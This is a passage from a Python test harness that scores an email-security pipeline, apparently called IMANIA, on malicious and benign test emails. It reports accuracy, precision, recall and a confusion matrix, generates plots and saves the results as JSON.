    parser.add_argument("--live-limit", type=int, default=15, help="Max live emails to fetch")
    args = parser.parse_args()

    run_llm = not args.no_llm

    print("=" * 60)
    print("  IMANIA — Pipeline Accuracy Test Suite")
    print("=" * 60)
    print(f"  LLM analysis: {'ON' if run_llm else 'OFF'}")
    print(f"  Live emails: {'YES' if args.live else 'NO'}")
    print()

    # Build test corpus
    cases = build_malicious_cases() + build_benign_cases()
    if args.live:
        print("[LIVE] Fetching live inbox emails...")
        live = load_live_emails(limit=args.live_limit)
        print(f"[LIVE] Loaded {len(live)} live emails")
        cases.extend(live)

    total_malicious = sum(1 for c in cases if c["expected"] == "malicious")
    total_benign = sum(1 for c in cases if c["expected"] == "benign")
    print(f"[CORPUS] {len(cases)} test cases: {total_malicious} malicious, {total_benign} benign\n")

    # Run each case through the pipeline
    all_results = []
    y_true = []
    y_pred = []

    for i, case in enumerate(cases, 1):
        tag = "MAL" if case["expected"] == "malicious" else "BEN"
        safe_desc = case['description'][:60].encode("ascii", "replace").decode("ascii")
        print(f"[{i:02d}/{len(cases)}] [{tag}] {case['name']}: {safe_desc}")

        t0 = time.time()
        result = run_pipeline_isolated(case["eml"], run_llm=run_llm)
        elapsed = time.time() - t0

        predicted = classify_result(result)
        y_true.append(case["expected"])
        y_pred.append(predicted)

        match = "OK" if case["expected"] == predicted else "MISS!"
        print(f"         -> {result['final_status'].upper()} (predicted={predicted}) [{match}] ({elapsed:.1f}s)")
        if match == "MISS!" and case["expected"] == "malicious":
            print(f"         *** FALSE NEGATIVE — malicious email NOT caught ***")

        all_results.append({"case": case, "result": result, "predicted": predicted, "elapsed": elapsed})
        # Remove raw eml bytes from stored results (large)
        case_copy = {k: v for k, v in case.items() if k != "eml"}
        all_results[-1]["case"] = case_copy

    # Compute metrics
    print("\n" + "=" * 60)
    print("  RESULTS")
    print("=" * 60)

    metrics = compute_metrics(y_true, y_pred)

    print(f"\n  Accuracy:   {metrics['accuracy']:.1%}")
    print(f"  Precision:  {metrics['precision']:.1%}  (of emails flagged malicious, how many truly were)")
    print(f"  Recall:     {metrics['recall']:.1%}  (of actual malicious emails, how many did we catch)")
    print(f"  F1 Score:   {metrics['f1']:.1%}")
    print()
    print(metrics["classification_report"])

    cm = metrics["confusion_matrix"]
    print(f"  Confusion Matrix:")
    print(f"                  Predicted")
    print(f"                  Benign  Malicious")
    print(f"  Actual Benign   {cm[0][0]:5d}    {cm[0][1]:5d}   (FP={cm[0][1]})")
    print(f"  Actual Malicious{cm[1][0]:5d}    {cm[1][1]:5d}   (FN={cm[1][0]})")

    if cm[1][0] > 0:
        print(f"\n  *** WARNING: {cm[1][0]} MALICIOUS EMAIL(S) MISSED (FALSE NEGATIVES) ***")
        for r in all_results:
            if r["case"]["expected"] == "malicious" and r["predicted"] == "benign":
                print(f"     - {r['case']['name']}: {r['case']['description']}")
    else:
        print(f"\n  All malicious emails detected (0 false negatives)")

    # Generate plots
    print("\n[PLOTS] Generating visualizations...")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    plot_confusion_matrix(cm, _OUT_DIR / f"confusion_matrix_{timestamp}.png")
    plot_metrics_bar(metrics, _OUT_DIR / f"metrics_{timestamp}.png")
    plot_stage_detection(all_results, _OUT_DIR / f"stage_heatmap_{timestamp}.png")
    plot_per_case_detail(all_results, _OUT_DIR / f"per_case_{timestamp}.png")
    plot_radar(metrics, _OUT_DIR / f"radar_{timestamp}.png")
    plot_verdict_pie(y_true, y_pred, _OUT_DIR / f"verdict_pie_{timestamp}.png")
    plot_attack_vector_coverage(all_results, _OUT_DIR / f"attack_vectors_{timestamp}.png")
    plot_latency(all_results, _OUT_DIR / f"latency_{timestamp}.png")
    plot_history_trend(_OUT_DIR / f"trend_{timestamp}.png")

    # Save raw results as JSON
    json_path = _OUT_DIR / f"results_{timestamp}.json"
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump({
            "timestamp": timestamp,
            "config": {"llm_enabled": run_llm, "live_emails": args.live},
            "corpus": {"total": len(cases), "malicious": total_malicious, "benign": total_benign},
            "metrics": {k: v for k, v in metrics.items() if k != "classification_report"},
            "classification_report": metrics["classification_report"],
            "cases": [
                {
                    "name": r["case"]["name"],
                    "expected": r["case"]["expected"],
                    "predicted": r["predicted"],
                    "final_status": r["result"]["final_status"],
                    "stages": r["result"]["stages"],
                    "elapsed_s": round(r["elapsed"], 2),
                }
                for r in all_results
            ],
        }, f, indent=2, default=str)
    print(f"  [JSON] Full results -> {json_path}")

    print(f"\n  All outputs saved to: {_OUT_DIR}")
    print("=" * 60)

    # Exit with error code if any false negatives
    if cm[1][0] > 0:
        sys.exit(1)


if __name__ == "__main__":
    main()
